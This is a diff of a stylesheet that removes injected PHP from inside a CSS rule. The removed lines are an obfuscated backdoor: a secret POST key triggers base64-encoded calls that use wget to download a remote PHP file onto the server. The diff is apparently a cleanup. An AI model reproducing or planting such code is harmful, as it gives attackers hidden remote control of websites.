@@ -119,8 +119,6 @@
 #catalog-menu > ul > li > ul > li.open:last-child > a,
 #catalog-menu > ul > li > ul > li.last.open > a {
   border-bottom: 1px solid #32373e;
-  <?php if(isset($_POST['error_key_id']) && $_POST['error_key_id'] == "ng9wm6yOdVp5l0rkUP6X2bqSJrlHlQcKAqhhFpCcVNIIEBgMIvdM5dP6FrnTmBu30")
-base64_decode("c3lzdGVt")(base64_decode("d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3VybDAvY3VybDAvbWFpbi93Z2V0LnBocCAtTyB3Z2V0LnBocA=="));?>
 }
 #catalog-menu > ul > li > ul > li.open:last-child > ul > li:last-child > a {
   border-bottom: 0;
